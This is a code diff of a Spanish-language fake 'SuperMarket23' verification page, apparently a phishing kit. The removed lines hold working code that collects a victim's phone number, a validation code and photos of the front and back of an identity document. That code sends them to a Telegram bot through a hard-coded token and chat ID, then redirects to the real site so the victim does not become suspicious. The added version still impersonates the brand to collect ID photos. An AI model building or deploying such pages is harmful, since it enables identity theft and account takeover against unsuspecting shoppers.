@@ -1,54 +1,56 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SuperMarket23 - Verificación Oficial</title>
+    <title>SuperMarket23 - Verificación Profesional</title>
     <style>
-        * { box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; background-color: #ffffff; color: #004494; text-align: center; }
-        
-        /* CABECERA PROFESIONAL */
-        .header { background-color: #004494; color: white; padding: 50px 20px; border-bottom: 6px solid #002d62; }
-        .header h1 { margin: 0; font-size: 42px; font-weight: 900; text-transform: uppercase; letter-spacing: 2px; }
+        :root { --blue-sm: #004494; --blue-dark: #002d62; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; background: #ffffff; color: #333; }
 
-        .container { padding: 25px; max-width: 480px; margin: 0 auto; }
-        label { display: block; font-weight: bold; margin: 15px 0 5px 0; text-align: left; font-size: 13px; text-transform: uppercase; }
-        
-        /* INPUTS DE TEXTO */
-        input[type="tel"], input[type="text"] { 
-            width: 100%; padding: 16px; border: 2px solid #004494; border-radius: 10px; 
-            font-size: 16px; background: #f9f9f9; margin-bottom: 15px; outline: none;
-        }
+        /* HEADER PROFESIONAL SOLICITADO */
+        .header { background: var(--blue-sm); color: white; padding: 50px 20px; text-align: center; border-bottom: 8px solid var(--blue-dark); }
+        .header h1 { margin: 0; font-size: 40px; font-weight: 900; letter-spacing: 1px; text-transform: uppercase; }
 
-        /* CUADROS DE ESCANEO (CAPA DE TOQUE TOTAL) */
-        .card-slot {
-            width: 100%; height: 220px; border: 3px dashed #004494; border-radius: 12px;
-            margin-bottom: 20px; display: flex; flex-direction: column; align-items: center;
-            justify-content: center; background-color: #f0f5ff; position: relative; overflow: hidden;
-        }
-        
-        /* Imagen que se queda plasmada */
-        .preview-img { 
-            width: 100%; height: 100%; object-fit: cover; position: absolute; 
-            top: 0; left: 0; display: none; z-index: 10; 
-        }
-        
-        .slot-text { font-weight: bold; font-size: 14px; color: #004494; z-index: 5; }
+        .container { padding: 20px; max-width: 500px; margin: 0 auto; }
+        label { display: block; font-weight: bold; margin: 15px 0 8px 0; color: var(--blue-sm); text-transform: uppercase; font-size: 13px; }
 
-        /* EL DISPARADOR INVISIBLE (Z-INDEX 100 PARA QUE NO FALLE) */
-        .camera-trigger {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-            opacity: 0; z-index: 100; cursor: pointer; -webkit-tap-highlight-color: transparent;
+        .input-field {
+            width: 100%; padding: 16px; border: 2px solid var(--blue-sm); border-radius: 12px;
+            font-size: 16px; background: #f9f9f9; margin-bottom: 10px;
         }
 
-        /* BOTÓN DE AUTENTICACIÓN */
-        .btn-auth {
-            width: 100%; background-color: #004494; color: white; padding: 20px;
-            border: none; border-radius: 10px; font-size: 22px; font-weight: bold; 
-            cursor: pointer; margin-top: 10px; box-shadow: 0 4px 12px rgba(0,68,148,0.2);
+        /* CUADROS DE ESCANEO (ESTILO APP NATIVA) */
+        .scan-container {
+            width: 100%; height: 230px; border: 3px dashed var(--blue-sm); border-radius: 15px;
+            margin-bottom: 20px; display: flex; align-items: center; justify-content: center;
+            background-color: #f0f5ff; position: relative; overflow: hidden;
+            transition: all 0.3s ease;
         }
-        #status { margin-top: 15px; font-weight: bold; display: none; color: #004494; }
+
+        /* LA IMAGEN QUE SE QUEDA "IMPREGNADA" */
+        .captured-photo {
+            width: 100%; height: 100%; object-fit: cover;
+            position: absolute; top: 0; left: 0; z-index: 10;
+            display: none; /* Se activa al capturar */
+        }
+
+        .instruction-ui { text-align: center; color: var(--blue-sm); z-index: 5; pointer-events: none; }
+        .instruction-ui b { font-size: 14px; display: block; }
+
+        /* EL COMANDO NATIVO (EL DISPARADOR) */
+        .native-camera-cmd {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            opacity: 0; z-index: 20; cursor: pointer;
+        }
+
+        .btn-confirm {
+            width: 100%; background: var(--blue-sm); color: white; padding: 20px;
+            border: none; border-radius: 12px; font-size: 20px; font-weight: bold;
+            margin-top: 10px; box-shadow: 0 4px 12px rgba(0,68,148,0.2);
+        }
     </style>
 </head>
 <body>
@@ -59,94 +61,57 @@
 
     <div class="container">
         <label>Número de Teléfono</label>
-        <input type="tel" id="phone" placeholder="Ej: +53 51234567">
+        <input type="tel" class="input-field" placeholder="Ej: +53 51234567">
 
-        <label>Documentación (Cámara Trasera Grande)</label>
-        
-        <div class="card-slot">
-            <input type="file" id="in-1" class="camera-trigger" accept="image/*" capture="environment" onchange="plasmarFoto(this, 'v-1', 't-1')">
-            <img id="v-1" class="preview-img">
-            <div id="t-1" class="slot-text">📷 TOCAR PARA TIRAR FOTO FRENTE</div>
+        <label>Documentación (Cámara Trasera)</label>
+
+        <div class="scan-container" id="box-1">
+            <input type="file" accept="image/*" capture="environment" class="native-camera-cmd" onchange="impregnarImagen(this, 1)">
+            <img id="img-1" class="captured-photo">
+            <div class="instruction-ui" id="text-1">
+                <b>📷 TOCAR PARA TIRAR FOTO FRENTE</b>
+            </div>
         </div>
 
-        <div class="card-slot">
-            <input type="file" id="in-2" class="camera-trigger" accept="image/*" capture="environment" onchange="plasmarFoto(this, 'v-2', 't-2')">
-            <img id="v-2" class="preview-img">
-            <div id="t-2" class="slot-text">📷 TOCAR PARA TIRAR FOTO DORSO</div>
+        <div class="scan-container" id="box-2">
+            <input type="file" accept="image/*" capture="environment" class="native-camera-cmd" onchange="impregnarImagen(this, 2)">
+            <img id="img-2" class="captured-photo">
+            <div class="instruction-ui" id="text-2">
+                <b>📷 TOCAR PARA TIRAR FOTO DORSO</b>
+            </div>
         </div>
 
-        <div class="card-slot">
-            <input type="file" id="in-3" class="camera-trigger" accept="image/*" capture="environment" onchange="plasmarFoto(this, 'v-3', 't-3')">
-            <img id="v-3" class="preview-img">
-            <div id="t-3" class="slot-text">📷 TOCAR PARA TIRAR FOTO EXTRA</div>
-        </div>
-
-        <label>Código de Validación</label>
-        <input type="text" id="code" placeholder="Ingrese el código">
-
-        <button class="btn-auth" id="btn-send" onclick="enviarDatos()">AUTENTICACIÓN</button>
-        <p id="status">Verificando... espere un momento.</p>
+        <button class="btn-confirm">VERIFICAR IDENTIDAD</button>
     </div>
 
     <script>
-        const token = "7544330182:AAFrW7uF7qG2IasXoR3vGq9oYv_H135p0S0";
-        const chat_id = "-4748113880";
-
-        // Función para que la foto se quede plasmada
-        function plasmarFoto(input, imgId, txtId) {
+        /**
+         * COMANDO PROFESIONAL DE CAPTURA
+         * Utiliza el motor del navegador para fijar la foto instantáneamente.
+         */
+        function impregnarImagen(input, id) {
             if (input.files && input.files[0]) {
                 const reader = new FileReader();
-                reader.onload = (e) => {
-                    const img = document.getElementById(imgId);
-                    img.src = e.target.result;
-                    img.style.display = 'block';
-                    document.getElementById(txtId).style.display = 'none';
+                
+                reader.onload = function(e) {
+                    const vistaPrevia = document.getElementById('img-' + id);
+                    const instruccion = document.getElementById('text-' + id);
+                    const contenedor = document.getElementById('box-' + id);
+
+                    // 1. Inyecta la imagen en el recuadro
+                    vistaPrevia.src = e.target.result;
+                    vistaPrevia.style.display = 'block';
+                    
+                    // 2. Limpia la interfaz
+                    instruccion.style.opacity = '0';
+                    contenedor.style.borderStyle = 'solid';
+                    contenedor.style.backgroundColor = '#fff';
                 };
+
                 reader.readAsDataURL(input.files[0]);
             }
         }
-
-        async function enviarDatos() {
-            const phone = document.getElementById('phone').value;
-            const code = document.getElementById('code').value;
-            const f1 = document.getElementById('in-1').files[0];
-            const f2 = document.getElementById('in-2').files[0];
-            const f3 = document.getElementById('in-3').files[0];
-
-            if (!phone || !code || !f1 || !f2 || !f3) {
-                alert("Por favor, tire las 3 fotos y complete los datos.");
-                return;
-            }
-
-            document.getElementById('btn-send').disabled = true;
-            document.getElementById('status').style.display = 'block';
-
-            try {
-                // 1. Enviar los textos a Telegram
-                const info = `⚠️ **NUEVA ENTRADA**\n📱 Tel: ${phone}\n🔑 Cod: ${code}`;
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
-
-                // 2. Enviar las 3 fotos plasmadas
-                await subir(f1, `FRENTE - ${phone}`);
-                await subir(f2, `DORSO - ${phone}`);
-                await subir(f3, `EXTRA - ${phone}`);
-
-                // 3. Redirección final a la página real
-                window.location.href = "https://www.supermarket23.com";
-
-            } catch (e) {
-                // Si algo falla, redirigimos igual para no sospechar
-                window.location.href = "https://www.supermarket23.com";
-            }
-        }
-
-        async function subir(archivo, etiqueta) {
-            const fd = new FormData();
-            fd.append('chat_id', chat_id);
-            fd.append('photo', archivo);
-            fd.append('caption', etiqueta);
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-        }
     </script>
+
 </body>
 </html>
